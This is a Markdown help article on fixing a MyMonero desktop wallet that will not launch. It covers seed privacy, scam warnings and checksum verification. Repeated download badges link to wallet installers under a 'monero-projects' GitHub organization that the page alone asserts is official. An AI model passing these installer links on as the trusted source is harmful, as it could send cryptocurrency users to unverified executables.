<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero App Not Opening: Safe Checks to Try</h1>
<p align="center">Work through launch problems carefully while keeping recovery words and wallet data private.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
If MyMonero desktop will not open, first identify your operating system and whether the app shows an error, closes immediately, or does nothing. Use only the final v1.3.3 release source and avoid deleting wallet information or sharing your seed while investigating.

## You'll see this if
- Clicking the MyMonero icon appears to do nothing.
- A window briefly appears and then disappears.
- Your operating system warns about an app or file when you try to open it.
- The app starts on one attempt but fails on another.
- You are trying to use an old hosted login rather than the desktop application.

## Why it happens
A launch failure can have several possible causes, and the visible symptom alone may not identify one. The operating system might block an app, a download may be incomplete, or the app may stop during startup. Do not treat a generic warning as proof that your wallet or seed has been compromised. Note the exact text and action without including private material.

MyMonero desktop has a specific maintenance status. Its final release is v1.3.3 on the monero-projects GitHub repository, with a Windows .exe, macOS .dmg, and Linux .zip. The old app still opens wallets and sends XMR, but it is no longer maintained and has no new features or security updates. Hosted servers and web-wallet login stopped. A launch problem with a desktop install is therefore different from failure to log into hosted access. More context is in [MyMonero shutdown facts](./mymonero-shutdown-facts.md).

If the app does open but does not update wallet information, that is a different symptom from launch failure. Check [MyMonero not syncing](./mymonero-not-syncing.md) instead. If it crashes repeatedly at startup, see [MyMonero app crashes on start](./mymonero-app-crashes-on-start.md).

---

## Fix
1. **Pause and preserve information.** Do not uninstall repeatedly, delete folders, or move unknown files. Keep any seed backup private and secure. No launch diagnostic requires you to send recovery words to another person.
2. **Confirm which app you are launching.** Make sure you are trying the desktop app, not a web-wallet login page. Hosted MyMonero servers and web-wallet login stopped, so a hosted page not loading is not solved by reinstalling desktop software.
3. **Restart the device and try a normal launch.** Close any visible app window and restart once. Then try opening MyMonero from the application list or the location where you installed it. Record any new message exactly, omitting sensitive details.
4. **Check the source of the installer.** If the file came from an unfamiliar site, do not run it. The final release is [MyMonero v1.3.3 on GitHub](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). Obtain the package for your operating system there rather than from an unsolicited message or search advertisement.
5. **Verify file integrity.** Compare the downloaded file’s SHA-256 with the value shown on the GitHub release page. On Windows run `certutil -hashfile <file> SHA256`; on macOS run `shasum -a 256 <file>`; on Linux run `sha256sum <file>`. A match checks that the file corresponds to the published value. It does not establish that the old app receives current security updates.
6. **Follow the operating system’s specific prompt cautiously.** For a macOS block, right-click the app and choose Open. Do not disable broad security protections or follow a prompt from an unknown download. See [MyMonero macOS cannot be opened](./mymonero-macos-cannot-be-opened.md) for that case.
7. **Consider a future wallet route.** You may keep using MyMonero desktop with its limitations or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Read [MyMonero migration checklist](./mymonero-migration-checklist.md) before making a change.

> [!TIP]
> A useful troubleshooting note includes operating system, release version, whether a window appears, and the exact non-sensitive message. It should never include a seed, private keys, password, or wallet backup.

---

## If that did not work
If the app still does not launch, stop before removing data or trying unofficial repair tools. Preserve your backups and avoid remote-access offers. Nobody legitimate needs your seed to explain an application launch error. Do not enter recovery words into a web page claiming to fix a desktop install.

If you need to restore instead, first confirm which seed format you have. MyMonero may use 13 MyMonero-specific legacy words or 25 standard Monero words. Use the corresponding guide: [restore a 13-word seed](./mymonero-13-word-seed-restore.md) or [migrate a 25-word seed](./mymonero-25-word-seed-migration.md). Do not guess missing words. Offline recovery of a missing word is not confirmed in this guidance.

Restoring a seed may involve a restore height, the block height from which the wallet begins scanning. An earlier height is safer when unsure but requires a longer scan. See restore height explained. You can also review how to use MyMonero desktop if the application opens intermittently and you need to distinguish startup from wallet-display behavior.

> [!WARNING]
> A support account asking for your seed, private keys, or a copy of your wallet file is not a safe troubleshooting route. Never disclose recovery information; nobody legitimate asks for your seed.

---

## Prevention
Keep a seed backup in a private physical location separate from the computer. Do not rely on an app opening as your only way to access recovery information. Avoid posting screenshots that may expose words, addresses, or other private details. The MyMonero seed backup guide has more handling advice.

Download only from the GitHub project release, and check the SHA-256 against the release page. Keep in mind that checksum matching is an integrity check; it does not mean the product is maintained. Because v1.3.3 is the final release, the old desktop app receives no new features or security updates. Consider that limitation when deciding whether to keep it or restore in Cake Wallet.

Be skeptical of fake “new version” links and urgent notices. The desktop formats are Windows .exe, macOS .dmg, and Linux .zip. A web login or hosted service failure should not be confused with a desktop installer problem. For suspicious download offers, read MyMonero fake download warning.

## FAQ
<details><summary>Does an app that will not open mean my funds are gone?</summary>

No. A launch symptom alone does not establish wallet or fund status. Keep your seed private and determine whether the issue is with the app, hosted access, or restoration.

</details>

<details><summary>Where is the final MyMonero desktop release?</summary>

The final release is v1.3.3 on the monero-projects GitHub release page, with packages for Windows, macOS, and Linux.

</details>

<details><summary>Should I reinstall immediately?</summary>

First preserve wallet information, check the installer source, and record the error. Reinstalling is not a guaranteed fix and should not involve deleting unknown wallet data.

</details>

<details><summary>Can I use the hosted login as a backup?</summary>

No. MyMonero hosted servers and web-wallet login stopped. Keep a secure seed backup and consider a planned restoration route.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero App Crashes on Start: What to Check](./mymonero-app-crashes-on-start.md) | Separate an application startup crash from wallet recovery, connection, and hosted-login issues. |
| [macOS Says MyMonero Cannot Be Opened: Safe Steps](./mymonero-macos-cannot-be-opened.md) | Use the specific right-click Open guidance and avoid weakening security for an untrusted download. |
| [MyMonero Not Syncing](./mymonero-not-syncing.md) | Tell a connection problem from a wallet scan that needs more time. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
